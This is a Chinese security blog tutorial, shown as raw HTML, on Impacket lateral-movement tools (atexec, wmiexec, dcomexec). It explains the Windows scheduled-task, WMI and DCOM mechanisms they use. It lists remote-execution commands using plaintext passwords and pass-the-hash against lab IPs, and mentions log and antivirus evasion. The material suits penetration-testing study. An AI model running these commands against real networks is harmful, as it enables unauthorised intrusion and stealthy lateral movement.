+<p>MS-TSCH：<a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?q=%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E7%A8%8B%E5%BA%8F%E6%9C%8D%E5%8A%A1%E8%BF%9C%E7%A8%8B%E5%8D%8F%E8%AE%AE&zhida_source=entity&is_preview=1">任务调度程序服务远程协议</a>，该协议用于注册和配置任务以及查询远程计算机上运行的任务的状态，主要由三个独立的RPC接口组成</p>
+<ul>
+<li>网络时间表（ATSvc）</li>
+<li><a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?q=%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E7%A8%8B%E5%BA%8F%E4%BB%A3%E7%90%86&zhida_source=entity&is_preview=1">任务计划程序代理</a> ( SASec)</li>
+<li>Windows Vista 操作系统<a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?q=%E4%BB%BB%E5%8A%A1%E8%BF%9C%E7%A8%8B%E5%8D%8F%E8%AE%AE&zhida_source=entity&is_preview=1">任务远程协议</a> ( ITaskSchedulerService )</li>
+</ul>
+<p>这三个接口都使用RPC作为远程配置和管理任务的传输，且它们的功能是逐级递增的。现如今，ITaskSchedulerService 成为了大部分计划任务操作的首选。同时，ITaskSchedulerService 接口不通过<a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?q=%E8%BF%9C%E7%A8%8B%E6%B3%A8%E5%86%8C%E8%A1%A8&zhida_source=entity&is_preview=1">远程注册表</a>和文件系统协议，而是通过XML来指定任务的配置。</p>
+<p>该三个接口在Impacket中均有实现</p>
+</blockquote>
+<h4 id="工具-2"><a href="#工具-2" class="headerlink" title="工具"></a>工具</h4><p>与smbexec类似</p>
+<p>明文和哈希值均可传递，并且连接后自动提权</p>
+<p>atexec是通过windows计划任务执行远程命令，atexec是一个半交互的工具，即参数中添加需要在远程主机执行的命令，工具执行后即返回命令结果，适用于webshell下，也适用于其他网络环境。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">atexec.exe ./administrator:Admin12345@192.168.3.21 &quot;whoami&quot; # 本地用户明文连接执行命令</span><br><span class="line">atexec.exe god/administrator:Admin12345@192.168.3.21 &quot;whoami&quot; #域内用户明文连接执行命令</span><br><span class="line"></span><br><span class="line">atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 &quot;whoami&quot; # 使用hash进行本地用户连接</span><br><span class="line">atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 &quot;whoami&quot; # 使用hash进行域内用户连接</span><br></pre></td></tr></table></figure>
+
+<h3 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h3><h4 id="项目-1"><a href="#项目-1" class="headerlink" title="项目"></a>项目</h4><p><a target="_blank" rel="noopener" href="https://github.com/rootclay/WMIHACKER">https://github.com/rootclay/WMIHACKER</a></p>
+<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>1、远程主机的WMI服务为开启状态（默认开启）<br>2、远程主机防火墙放行135端口，这是WMI管理的默认端口</p>
+<p>内网中，由于大多数 Windows 系统自带 wmic 命令， 所以 WMIC 是内网横向的常用方法之一，使用 WMI 的前置要求是，<strong>目标端口开放 135 端口，且允许随机一个高位端口进行通信</strong>。这是由于 WMI 是先通过 135 端口建立连接，而后通过随机的高位端口进行数据传输。</p>
+<p>直接使用系统自带的 WMIC 进行连接，执行命令是无回显的，常常需要将执行的返回结果写入文件，再通过文件读取的方式将回显带回来。</p>
+<h4 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h4><p>全称是Windows management instrumentation，它出现在所有的Windows操作系统中，并由一组强大的工具集合组成，用于管理本地或远程的Windows系统，攻击者使用wmi来进行攻击，但Windows系统默认不会再日志中记录这些操作，可以做到无日志，攻击脚本无需写入到磁盘，增加了隐蔽性。推荐使用wmiexec进行远程执行命令</p>
+<h4 id="wmiexec-1"><a href="#wmiexec-1" class="headerlink" title="wmiexec"></a>wmiexec</h4><p>大牛使用VBS脚本调用WMI来模拟 psexec 的功能，于是乎WMIEXEC 就诞生了。基本上psexec 能用的地方，这个脚本也能够使用。整个过程是先调用WMI通过账号密码或者NTLM认证（WCE注入）连接到远程计算机，然后如果提供了账号密码，则用这个账号密码建立一个到目标的IPC连接。随后WMI会建立一个共享文件夹，用于远程读取命令执行结果。 当用户输入命令时，WMI创建进程执行该命令，然后把结果输出到文件，这个文件位于之前创建的共享文件夹中。最后，通过FSO组件访问远程共享文件夹中的结果文件，将结果输出。当结果读取完成时，调用WMI执行命令删除结果文件。最后当WMIEXEC退出时，删除文件共享</p>
+<h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p><strong>wmiexec.py</strong></p>
+<p>首先是 impacket 工具包里的 wmiexec.py。提供了通过 wmi 执行命令并回显的功能。其原理较为简单：通过 wmi 执行命令，并将执行结果保存文件，通过 smb 读取返回结果。如下是 wmiexec.py 的一个片段，其中 <strong>__output</strong> 为输出的临时文件， <strong>__transferClient</strong> 为 smb 的连接。所以，该工具的使用条件是需要 445、135 和高位随机的一个端口都允许通信。</p>
+<p>wmiexec.py 还支持无回显的方式进行命令执行。这种方式是不会建立 SMB 连接，也就不需要 445 端口的开放。</p>
+<p><strong>WMICMD</strong></p>
+<p><strong>WMICMD</strong> 的实现原理和 <strong>wmiexec.py</strong> 有些出入。上面介绍了 <strong>WMICMD</strong> 之所以能得到回显的原因，是借助了 445 端口的 SMB 连接。而 <strong>WMICMD</strong> 能够做到不需要 445 端口就可以完成命令执行并回显。其原理是通过命令执行将执行结果写入注册表之中，再通过 WMI 对注册表进行操作，读取结果，这样一来就不需要 445 端口了。如下是 <strong>WMICMD</strong> 通过注册表获取执行结果回显的代码片段。</p>
+<p><strong>WMIHACKER</strong></p>
+<p><strong>WMIHACKER</strong> 也是通过将命令执行将执行结果写入到注册表，但不一样的地方是 <strong>wmiexe.py</strong> 和 <strong>wmicmd</strong> 是通过创建一个 win32Process 进程来执行命令，而 <strong>WMIHACKER</strong> 是使用<strong>事件触发器来调用 VB 代码</strong>，达到命令执行的效果。根据介绍，这种方式在当时可以绕过杀软。</p>
+<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py uf9n1x/Administrator:123qwe@@192.168.1.131 </span><br><span class="line"></span><br><span class="line">wmiexec.exe ./administrator:123qwe@@192.168.1.131 &quot;whoami&quot; </span><br><span class="line">wmiexec.exe god/administrator:Admin12345@192.168.1.131 &quot;whoami&quot; </span><br><span class="line">wmiexec.exe -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.1.131 &quot;whoami&quot; </span><br><span class="line">wmiexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 uf9n1x/administrator@192.168.1.131 &quot;whoami&quot;</span><br><span class="line"></span><br><span class="line">cscript //nologo wmiexec.vbs /shell 192.168.1.131 administrator 123qwe@</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wmic /node:192.168.1.131 /user:administrator /password:123qwe@ process call create &quot;cmd.exe /c ipconfig &gt;C:\1.txt&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="Refer-2"><a href="#Refer-2" class="headerlink" title="Refer"></a>Refer</h4><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1895804">https://cloud.tencent.com/developer/article/1895804</a></p>
+<h3 id="dcomexec"><a href="#dcomexec" class="headerlink" title="dcomexec"></a>dcomexec</h3><h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><h5 id="COM"><a href="#COM" class="headerlink" title="COM"></a>COM</h5><p>COM即组件对象模型(Component Object Model，COM) ，是基于 Windows 平台的一套<strong>组件对象接口标准</strong>，由一组<strong>构造规范</strong>和<strong>组件对象库</strong>组成。COM是许多微软产品和技术，如Windows媒体播放器和Windows Server的基础。</p>
+<p>一般的对象是由数据成员和作用在其上的方法组成，而组件对象和一般对象虽有相似性，但又有较大不同。组件对象不使用方法而用接口来描述自身。接口被定义为“在对象上实现的一组语义上相关的功能”，其实质是一组函数指针表，每个指针必须初始化指向某个具体的函数体，一个组件对象实现的接口数量没有限制。</p>
+<p>Windows COM（Component Object Model，组件对象模型）是微软开发的一种软件架构，它允许应用程序的组件以对象的形式进行交互。COM 定义了一种标准，这种标准与编程语言无关，并且可以使组件在进程内或跨进程（甚至跨网络）进行通信。这意味着开发者可以使用任何支持 COM 的编程语言来创建或使用 COM 组件。</p>
+<h5 id="DCOM"><a href="#DCOM" class="headerlink" title="DCOM"></a>DCOM</h5><p>DCOM（分布式组件对象模型）是微软基于组件对象模型（COM）的一系列概念和程序接口，它支持不同的两台机器上的组件间的通信，不论它们是运行在局域网、广域网、还是Internet上。利用这个接口，客户端程序对象能够向网络中另一台计算机上的服务器程序对象发送请求。</p>
+<blockquote>
+<p>DCOM是COM（组件对象模型）的扩展，它允许应用程序实例化和访问远程计算机上COM对象的属性和方法。DCOM 使用远程过程调用（RPC）技术将组件对象模型（COM）的功能扩展到本地计算机之外，因此，在远程系统上托管COM服务器端的软件（通常在DLL或exe中）可以通过RPC向客户端公开其方法。</p>
+</blockquote>
+<p>攻击者可使用 DCOM 进行横向移动，通过 DCOM，攻击者可在拥有适当权限的情况下通过 Office 应用程序以及包含不安全方法的其他 Windows 对象远程执行命令。</p>
+<p>使用DCOM进行横向移动的优势之一在于，<strong>在远程主机上执行的进程将会是托管COM服务器端的软件</strong>。例如我们滥用ShellBrowserWindow COM对象，那么就会在远程主机的现有explorer.exe进程中执行。对攻击者而言，这无疑能够增强隐蔽性，由于有大量程序都会向DCOM公开方法，因此防御者可能难以全面监测所有程序的执行。</p>
+<h4 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h4><p>类似wmiexec.py的半交互式Shell，但是使用了DCOM接口，目前支持的接口有<code>MMC20.Application</code>、<code>ShellWindows</code>、<code>ShellBrowserWindows</code></p>
+<h4 id="工具-3"><a href="#工具-3" class="headerlink" title="工具"></a>工具</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./dcomexec.py domain/username:password@ip</span><br><span class="line">./dcomexec.py domain/username:password@ip &lt;command&gt;</span><br></pre></td></tr></table></figure>
+
+<p>powershell</p>
+<h4 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h4><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/261454.html">https://www.freebuf.com/articles/network/261454.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9691?time__1311=n4+xnD0DuDRDgD02DhD/ia4BKK0KKhR+qq+FID">https://xz.aliyun.com/t/9691?time__1311=n4%2BxnD0DuDRDgD02DhD%2Fia4BKK0KKhR%2Bqq%2BFID</a></p>
+
+                
+                <p class="end">__END__</p>
+            </div>
+            <div class="article-footer">
+                <div class="suffix-box">
+    <div class="suffix-box-left">
+        <img src="/image/sidebar/avatar.png" alt="tpaer">
+    </div>
+    <div class="suffix-box-right">
+        <span class="suffix-box-title">文章作者：</span>tpaer
+        <br>
+        <span class="suffix-box-title">文章出处：</span><a href="/posts/3468438092.html" target="_blank">Impacket横向移动工具使用及原理</a>
+        <br>
+        <span class="suffix-box-title">作者签名：</span>nice or terrible.
+        <br>
+        <span class="suffix-box-title">关于主题：</span><a href="" target="_blank"></a>
+        <br>
+        <span class="suffix-box-title">版权声明：</span>文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议，转载请注明出处
+        <br>
+    </div>
+    <div style="clear: both;"></div>
+</div>
+                
+                    <div class="category">
+                        分类：
+                        
+                            <a href="/category/web/">web</a>
+                        
+                    </div>
+                
+                
+                    <div class="tag">
+                        标签：
+                        
+                            <a href="/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+                        
+                    </div>
+                
+                <div class="article-prev-next">
+                    
+                        <a href="/posts/290788003.html" class="prev-prefix">« </a> 上一篇：    <a href="/posts/290788003.html" title="发布于 2024-09-11 01:01">逆向学习-SMC和花指令</a>
+                        <br>
+                    
+                    
+                        <a href="/posts/1746513925.html" class="next-prefix">» </a> 下一篇：    <a href="/posts/1746513925.html" title="发布于 2024-08-22 11:44">ToDesk渗透利用备忘</a>
+                    
+                </div>
+            </div>
+             
+        </div>
+    
+</div>
+    <div id="footer">
+    <div><span class='face'>ღゝ◡╹)ノ♡</span></div><div>hello</div><div>&copy; 2023-2077 tpaer. All Rights Reserved.</div>
+</div>
+    <div id="sidebar">
+    <div class="menu-wrap" style="display:none;">
+        
+            <div class="menu-notice">
+                <span class="iconfont icon-notice"></span>
+                <div class="notice">
+                    <span>Tpaer Blog</span>
+                </div>
+            </div>
+        
+        <nav class="menu">
+            <div class="menu-introduce"> 
+                <div class="introduce-avatar">
+                    <img src="/image/sidebar/avatar.png">
+                </div> 
+                <div class="introduce-info"> 
+                    <div class="introduce-user">
+                        
+                            <a href="https://onetpaer.github.io" target="_blank"><span>tpaer</span></a>
+                        
+                    </div>
+                </div> 
+            </div> 
+            <div class="menu-list">
+                <ul>
+                    
+                        <li class=""><a href="/" class="" target="_self"><span class="iconfont icon-home-fill"></span>首页</a></li>
+                    
+                        <li class=""><a href="/category" class="" target="_self"><span class="iconfont icon-folder-fill"></span>分类</a></li>
+                    
+                        <li class=""><a href="/tag" class="" target="_self"><span class="iconfont icon-discount-fill"></span>标签</a></li>
+                    
+                        <li class=""><a href="/archive" class="" target="_self"><span class="iconfont icon-calendar-fill"></span>归档</a></li>
+                    
+                        <li class=""><a href="/about" class="" target="_self"><span class="iconfont icon-about-fill"></span>关于</a></li>
+                    
+                        <li class=""><a href="javascript:;" class="search" target="_self"><span class="iconfont icon-search-menu"></span>搜索</a></li>
+                    
+                        <li class=""><a href="/comment" class="" target="_self"><span class="iconfont icon-comments-fill"></span>留言板</a></li>
+                    
+                </ul> 
+            </div> 
+            <div class="menu-link">
+                <div class="box">
+                    <div class="image-box"></div>
+                </div>
+                
+                    <a name="GitHub" href="https://github.com/onetpaer" class="" target="_blank" data=""><span class="iconfont icon-github"></span></a>
+                
+            </div> 
+        </nav>
+        <button class="menu-button-close"></button>
+        <div class="morph-shape" id="morph-shape" data-morph-open="M-7.312,0H15c0,0,66,113.339,66,399.5C81,664.006,15,800,15,800H-7.312V0z;M-7.312,0H100c0,0,0,113.839,0,400c0,264.506,0,400,0,400H-7.312V0z">
+            <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 100 800" preserveAspectRatio="none">
+                <path d="M-7.312,0H0c0,0,0,113.839,0,400c0,264.506,0,400,0,400h-7.312V0z"/>
+            </svg>
+        </div>
+    </div>
+    <button class="menu-button-open">MENU</button>
+    <div class="menu-cover"></div>
+</div>
+    <link type="text/css" rel="stylesheet" href="/css/search.css">
+<script type="text/javascript" src="/js/iscroll.js"></script>
+<script type="text/javascript" src="/js/instantsearch.min.js"></script>
+<div class="search-window">
+    <div class="search-content">
+        <div class="search-content-icon">
+            <i class="iconfont icon-search"></i>
+        </div>
+        <div id="search-input" class="search-input"></div>
+    </div>
+
+    <div class="search-scroll">
+        <div class="search-result">
+            <div id="search-stats" class="search-stats"></div>
+            <div id="search-hits"></div>
+            <div id="search-pagination" class="search-pagination"></div>
+        </div>
+    </div>
+
+    <span class="search-close-icon">
+        <i class="iconfont icon-close"></i>
+    </span>
+</div>
+    <div id="tools">
+    <div class="progressbar-top"></div>
+    
+    <link type="text/css" rel="stylesheet" href="/css/APlayer.css">
+    <script type="text/javascript" src="/js/APlayer.min.js"></script>
+    <script type="text/javascript" src="/js/Meting.min.js"></script>
+    <script>
+        var meting_api = 'https://api.i-meto.com/meting/api?server=:server&type=:type&id=:id&auth=:auth&r=:r';
+    </script>
+    <meting-js id="3778678" lrcshow="false" server="netease" type="playlist" fixed="true" autoplay="false" loop="all" order="random" preload="auto" volume="0.67" mutex="true"></meting-js>
+
+    <div class="wrap-right">
+    <div class="wrap-right-hide">
+         <div class="wrap-right-button favorites">
+            <div class="iconbox" switch="false">
+                <span class="iconfont icon-favorites"></span>
+            </div>
+            <span class="icontext">关注</span>
+         </div>
+        <div class="wrap-right-button search">
+            <div class="iconbox">
+                <span class="iconfont icon-search-menu"></span>
+            </div>
+            <span class="icontext">搜索</span>
+        </div>
+        <div class="wrap-right-button menu-button">
+            <div class="iconbox">
+                <span class="iconfont icon-menu"></span>
+            </div>
+            <span class="icontext">菜单</span>
+        </div>
+        <div class="wrap-right-button mode">
+            <div class="light">
+                <div class="iconbox">
+                    <span class="iconfont icon-daymode"></span>
+                </div>
+                <span class="icontext">浅色模式</span>
+            </div>
+            <div class="dark">
+                <div class="iconbox">
+                    <span class="iconfont icon-nightmode-fill"></span>
+                </div>
+                <span class="icontext">深色模式</span>
+            </div>
+        </div>
+        <div class="wrap-right-button bottom">
+            <div class="iconbox">
+                <span class="iconfont icon-top"></span>
+            </div>
+            <span class="icontext">跳至底部</span>
+        </div>
+    </div>
+    <div class="wrap-right-show">
+        <div class="wrap-right-button set">
+            <div class="iconbox">
+                <span class="iconfont icon-setting"></span>
+            </div>
+            <span class="icontext">设置</span>
+        </div>
+        <div class="wrap-right-button top">
+            <div class="iconbox">
+                <span class="iconfont icon-top"></span>
+            </div>
+            <span class="icontext">返回顶部</span>
+        </div>
+    </div>
+</div>
+    <div class="loading"></div>
+</div>
+    <script>
+    window.config = {
+        GitHubUserName     : "onetpaer",
+        GitHubRepositories : "hacker-note",
+
+        User             : "tpaer",
+        UserAvatar       : "/image/sidebar/avatar.png",
+        WebsiteStartDate : "2023-01-01",
+        Home             : "https://onetpaer.github.io",
+
+        WebsiteTitleBlur         : "(◍´꒳`◍) Hi, Tpaer BLOG",
+        WebsiteTitleBlurTimeOut  : 500,
+        WebsiteTitleFocus        : "(*´∇｀*) Welcome back!",
+        WebsiteTitleFocusTimeOut : 1000,
+        WebsiteFavicon           : {
+            light : "/image/website/logo/tlogo.png",
+            dark  : "/image/website/logo/tlogo.png"
+        },
+
+        ProgressBar : {
+            id       : "topProgressBar",
+            color    : "#77B6FF",
+            height   : "2px",
+            duration : 0.2
+        },
+
+        Loading: {
+            rebound : {
+                tension  : 16,
+                friction : 5
+            },
+            spinner : {
+                id     : "spinner",
+                radius : 90,
+                sides  : 3,
+                depth  : 4,
+                colors : {
+                    background : "#F0F0F0",
+                    stroke     : "#272633",
+                    base       : "",
+                    child      : "#272633"
+                },
+                alwaysForward : true,
+                restAt        : 0.5,
+                renderBase    : false
+            }
+        },
+
+        HomeHeaderAnimationRendered : true,
+        HomeHeaderAnimation         : {
+            radius      : 15,
+            density     : 0.2,
+            color       : "rgba(255, 255, 255, .2)",
+            clearOffset : 0.3
+        },
+
+        BackAnimationRendered          : true,
+        IEBrowserBackAnimationRendered : false,
+        BackAnimation                  : {
+            colorSaturation  : "60%",
+            colorBrightness  : "50%",
+            colorAlpha       : 0.5,
+            colorCycleSpeed  : 5,
+            verticalPosition : "random",
+            horizontalSpeed  : 200,
+            ribbonCount      : 3,
+            strokeSize       : 0,
+            parallaxAmount   : -0.2,
+            animateSections  : true
+        },
+
+        HomeHeaderImage : [
+            
+                "/image/header/home.png",
+            
+        ],
+        HomeBannerText  : "Cybersecurity",
+
+        ArticleHeaderImage : [
+            
+                "/image/header/article.png",
+            
+                "/image/header/article3.png",
+            
+                "/image/header/article4.png",
+            
+        ],
+
+        OtherBannerText : "All because of love",
+
+        Error : {
+            icon    : "icon-swimming",
+            title   : "PAGE NOT FOUND",
+            content : [
+                
+                    "很抱歉，您访问的页面不存在！",
+                
+                    "可能是输入地址有误或该地址已变更。",
+                
+            ],
+            buttons : [
+                
+                    {
+                        icon  : "icon-home",
+                        text  : "返回首页",
+                        href  : "/",
+                        class : ""
+                    },
+                
+            ]
+        },
+
+        MenuNotice : {
+            enable : true,
+            notice : "Tpaer Blog",
+            speed  : 20
+        },
+        MenuList : [
+            
+                {
+                    name   : "首页",
+                    icon   : "icon-home-fill",
+                    href   : "/",
+                    type   : "index",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "分类",
+                    icon   : "icon-folder-fill",
+                    href   : "/category",
+                    type   : "category",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "标签",
+                    icon   : "icon-discount-fill",
+                    href   : "/tag",
+                    type   : "tag",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "归档",
+                    icon   : "icon-calendar-fill",
+                    href   : "/archive",
+                    type   : "archive",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "关于",
+                    icon   : "icon-about-fill",
+                    href   : "/about",
+                    type   : "about",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "搜索",
+                    icon   : "icon-search-menu",
+                    href   : "javascript:;",
+                    type   : "",
+                    class  : "search",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "留言板",
+                    icon   : "icon-comments-fill",
+                    href   : "/comment",
+                    type   : "comment",
+                    class  : "",
+                    target : "_self"
+                },
+            
+        ],
+        MenuLink : [
+            
+                
+                    {
+                        name   : "GitHub",
+                        icon   : "icon-github",
+                        href   : "https://github.com/onetpaer",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+            
+        ],
+
+        FooterStyle : 2,
+        BottomText  : "<div><span class='face'>ღゝ◡╹)ノ♡</span></div><div>hello</div><div>&copy; 2023-2077 tpaer. All Rights Reserved.</div>",
+
+        ConsoleList : [
+            
+                
+                    [
+                        
+                            
+                                "Tpaer Blog",
+                            
+                                "",
+                            
+                        
+                    ],
+                
+            
+        ],
+
+        FontIconExtend : "",
+
+        Donate : {
+            paypal  : "",
+            bitcoin : "",
+            alipay  : "/image/donate/alipay.png",
+            wechat  : "/image/donate/wechat.png"
+        },
+
+        Search : {
+            applicationID : "TIB5V1ZDSN",
+            apiKey        : "eb10299c1d35e47748cf90761834aec4",
+            indexName     : "hack-note",
+            hits          : {
+                page : 10
+            },
+            labels        : {
+                placeholder : "搜索",
+                empty       : "未发现与 「${query}」 相关的内容",
+                stats       : "${hits} 条相关条目，使用了 ${time} 毫秒",
+            }
+        }, 
+
+        Comment : {
+            switch : true,
+            type   : "Valine",
+        },
+
+        Waline : {
+            el              : ".comments-content",
+            serverURL       : "",
+            path            : window.location.pathname,
+            meta            : "['nick', 'mail', 'link']",
+            requiredMeta    : "['nick', 'mail']",
+            pageSize        : 10,
+            lang            : "zh-cn",
+            locale: {
+                admin       : "博主",
+                anonymous   : "匿名用户",
+                sofa        : "快来做第一个评论的人吧 ~",
+                placeholder : "你是我一生只会遇见一次的惊喜...",
+            },
+            dark            : "html[color-scheme='dark']",
+            search          : false,
+            pageview        : true,
+            comment         : true,
+            copyright       : false,
+        },
+
+        Valine : {
+            el             : ".comments-content",
+            appId          : "srhKtvWPQTWYKh3qX8G8M7v0-gzGzoHsz",
+            appKey         : "8uVSP1q6UlALVC5igYfIfv2h",
+            serverURLs     : "",
+            placeholder    : "你是我一生只会遇见一次的惊喜...",
+            avatar         : "mm",
+            meta           : "nick,mail,link",
+            requiredFields : "nick,mail",
+            pageSize       : 5,
+            lang           : "zh-cn",
+            visitor        : true,
+            enableQQ       : true
+        },
+
+        Tocbot : {
+            switch                : true,
+            tocSelector           : ".toc",
+            contentSelector       : ".article-body",
+            headingSelector       : "h1, h2, h3, h4, h5",
+            headingsOffset        : 0,
+            scrollSmooth          : true,
+            scrollSmoothOffset    : -5,
+            positionFixedSelector : ".toc",
+            positionFixedClass    : "toc-fixed",
+            fixedSidebarOffset    : "",
+        },
+
+        Require : {
+            baseUrl     : "/js/",
+            waitSeconds : 100
+        },
+
+        Music : {
+            type : "Meting"
+        },
+        APlayer : {
+            container : ".aplayer",
+            fixed     : true,
+            autoplay  : false,
+            loop      : "all",
+            order     : "random",
+            preload   : "auto",
+            volume    : 0.67,
+            mutex     : true,
+            lrcType   : 3,
+            audio     : [
+                
+                    {
+                        name   : "Endless Tears",
+                        artist : "CLIFF EDGE",
+                        cover  : "/music/cover/Endless Tears.jpg",
+                        url    : "/music/song/Endless Tears.mp3",
+                        lrc    : "/music/lrc/Endless Tears.lrc"
+                    },
+                
+            ]
+        },
+        Meting : {
+            api      : "https://api.i-meto.com/meting/api",
+            id       : "3778678", 
+            lrcshow  : false, 
+            server   : "netease", 
+            type     : "playlist", 
+            fixed    : true, 
+            autoplay : false, 
+            loop     : "all", 
+            order    : "random", 
+            preload  : "auto", 
+            volume   : 0.67, 
+            mutex    : true
+        },
+
+        Mouse : {
+            enable  : true,
+            options : {
+                size  : 6,
+                sizeF : 24
+            }
+        },
+
+        LazyLoad : {
+            default : "/image/website/lazyload.svg"
+        },
+  
+        Style : {
+            aplayer          : "/css/APlayer.css",
+            archive          : "/css/archive.css",
+            base             : "/css/base.css",
+            clipboard        : "/css/clipboard.css",
+            code             : "/css/code.css",
+            donate           : "/css/donate.css",
+            fancybox         : "/css/jquery.fancybox.css",
+            footer           : "/css/footer.css",
+            iconfont         : "/iconfont/iconfont.css",
+            index            : "/css/index.css",
+            menuBubble       : "/css/menu-bubble.css",
+            mouse            : "/css/mouse.css",
+            page             : "/css/page.css",
+            post             : "/css/post.css",
+            search           : "/css/search.css",
+            tocbot           : "/css/tocbot.css",
+            valine           : "/css/valine.css",
+            waline           : "/css/waline.css",
+            walineCustom     : "/css/waline-custom.css"
+        },
+
+        Script: {
+            aplayer          : "/js/APlayer.min.js",
+            config           : "/js/require.config.js",
+            index            : "/js/index.js",
+            instantSearch    : "/js/instantsearch.min.js",
+            iscroll          : "/js/iscroll.js",
+            jQuery           : "/js/jquery-3.4.1.min.js",
+            loading          : "/js/loading.js",
+            meting           : "/js/Meting.min.js",
+            require          : "/js/require.min.js",
+            waline           : "/js/waline.mjs",
+            pageview         : "/js/pageview.mjs",
+            comment          : "/js/comment.mjs",
+        },
+
+        Font: {
+            LongCang    : "/font/LongCang.css",
+            Monda       : "/font/Monda.css",
+            NotoSansSC  : "/font/NotoSansSC.css",
+            NotoSerifSC : "/font/NotoSerifSC.css",
+            Playball    : "/font/Playball.css",
+            PTMono      : "/font/PTMono.css",
+            Roboto      : "/font/Roboto.css",
+            RobotoSlab  : "/font/RobotoSlab.css",
+            Rosario     : "/font/Rosario.css",
+            UbuntuMono  : "/font/UbuntuMono.css"
+        },
+
+        Suffix : {
+            about : "nice or terrible."
+        },
+            
+        Theme : {
+            url  : "",
+            name : ""
+        }  
+    };
+</script>
+    <script type="text/javascript" src="/js/index.js"></script>
+</body>
+</html>
